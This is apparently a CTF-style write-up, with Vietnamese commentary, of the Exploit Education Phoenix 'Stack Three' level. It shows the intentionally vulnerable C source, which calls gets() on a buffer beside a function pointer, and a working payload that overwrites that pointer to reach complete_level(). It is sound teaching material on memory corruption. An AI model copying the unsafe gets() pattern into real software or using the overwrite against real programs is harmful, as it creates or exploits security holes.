## <center>[STACK THREE](https://exploit.education/phoenix/stack-three/)</center>
>Stack Three looks at overwriting function pointers stored on the stack.
> ##### Hints
> + You can use gdb and objdump to determine where the complete_level() function is in memory.

#### Source code
```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```
### Solution:
- Level này yêu cầu ta phải ghi đè địa chỉ của hàm `complete_level` lên con trỏ `locals.fp` để có khi gọi nó có thể trả về hàm `complete_level`
- Tương tự như các level trước chương trình cho nhập dữ liệu vào biến `buffer` không giới hạn mà biến `buffer` chỉ được khai báo 64 byte nên khi nhập hơn 64 kí tự sẽ bị tràn vào biến `locals.fp`, nếu tràn đúng địa chỉ của hàm `complete_level` thì ta sẽ giải quyết được
- Ta gdb để in ra địa chỉ của hàm `complete_level` 
```
(gdb) print complete_level
$1 = {<text variable, no debug info>} 0x40069d <complete_level>
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128):
```
 ``` 
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
